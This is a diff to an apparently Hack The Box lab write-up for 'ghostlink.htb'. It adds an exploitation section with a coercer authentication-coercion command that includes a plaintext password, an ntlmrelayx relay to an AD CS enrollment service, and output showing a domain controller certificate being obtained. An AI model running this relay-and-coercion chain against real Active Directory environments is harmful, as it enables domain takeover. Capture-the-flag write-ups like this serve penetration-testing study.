@@ -1100,10 +1100,64 @@ Certificate Templates                   : [!] Could not find any certificate tem
 
 ### Exploitation
 
-Step-by-step privilege escalation.
 
 ```shell
-# Commands used
+sudo proxychains ~/.local/bin/ntlmrelayx.py -t rpc://172.16.20.10 -rpc-mode ICPR -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' -smb2support --template DomainController
+
+```
+
+```
+coercer coerce -l 10.10.14.148 -t dc01.ghostlink.htb -d ghostlink.htb -u nvirelli -p u47YUclrDiwWxBheaSzI --always-continue
+       ______
+      / ____/___  ___  _____________  _____
+     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
+    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
+    \____/\____/\___/_/   \___/\___/_/       by @podalirius_
+
+[info] Starting coerce mode
+[info] Scanning target dc01.ghostlink.htb
+[*] DCERPC portmapper discovered ports: 49664,49665,49666,49667,49898,49675,49677,49678,49906,60662,49887
+[+] DCERPC port '49677' is accessible!
+   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!
+      [>] (-testing-) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine='\\10.10.14.148\x00'      [!] (NO_AUTH_RECEIVED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine='\\10.10.14.148\x00') 
+      [>] (-testing-) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine='\\10.10.14.148\x0      [!] (NO_AUTH_RECEIVED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine='\\10.10.14.148\x00') 
+[+] SMB named pipe '\PIPE\eventlog' is accessible!
+   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
+      [!] (NO_AUTH_RECEIVED) MS-EVEN──>ElfrOpenBELW(BackupFileName='\??\UNC\10.10.14.148\PxS9jFCu\aa') 
+[+] SMB named pipe '\PIPE\lsarpc' is accessible!
+[+] SMB named pipe '\PIPE\lsass' is accessible!
+[+] SMB named pipe '\PIPE\netdfs' is accessible!
+   [+] Successful bind to interface (4fc742e0-4a10-11cf-8273-00aa004ae673, 3.0)!
+      [!] (NO_AUTH_RECEIVED) MS-DFSNM──>NetrDfsAddStdRoot(ServerName='\\10.10.14.148\DzWj1uJ9\file.txt\x00') 
+      [!] (NO_AUTH_RECEIVED) MS-DFSNM──>NetrDfsAddStdRoot(ServerName='\\10.10.14.148\G8wdaUR1\\x00') 
+      [!] (SMB_STATUS_PIPE_DISCONNECTED) MS-DFSNM──>NetrDfsAddStdRoot(ServerName='\\10.10.14.148\Q0jcifSH\x00') 
+      [!] (NO_AUTH_RECEIVED) MS-DFSNM──>NetrDfsAddStdRoot(ServerName='\\10.10.14.148@80/KT0\share\file.txt\x00') 
+      [!] (SMB_STATUS_PIPE_DISCONNECTED) MS-DFSNM──>NetrDfsRemoveStdRoot(ServerName='\\10.10.14.148\fGR1Z8vd\file.txt\x00') 
+      [!] (SMB_STATUS_PIPE_DISCONNECTED) MS-DFSNM──>NetrDfsRemoveStdRoot(ServerName='\\10.10.14.148\bBHjQtTc\\x00') 
+      [!] (SMB_STATUS_PIPE_DISCONNECTED) MS-DFSNM──>NetrDfsRemoveStdRoot(ServerName='\\10.10.14.148\2LBatZrA\x00') 
+      [!] (SMB_STATUS_PIPE_DISCONNECTED) MS-DFSNM──>NetrDfsRemoveStdRoot(ServerName='\\10.10.14.148@80/xEL\share\file.txt\x00') 
+[+] SMB named pipe '\PIPE\netlogon' is accessible!
+[+] SMB named pipe '\PIPE\samr' is accessible!
+[+] All done! Bye Bye!
+
+```
+
+```
+[*] Servers started, waiting for connections
+[*] (RPC): Received connection from 10.129.191.32, attacking target rpc://172.16.20.10
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:135  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:55678  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:55678  ...  OK
+[*] (RPC): Authenticating connection from GHOSTLINK/DC01$@10.129.191.32 against rpc://172.16.20.10 SUCCEED [1]
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Generating CSR...
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> CSR generated!
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Getting certificate...
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Successfully requested certificate
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Request ID is 5
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Writing PKCS#12 certificate to ./DC01.pfx
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Certificate successfully written to file
+
+
 ```
 
 ---
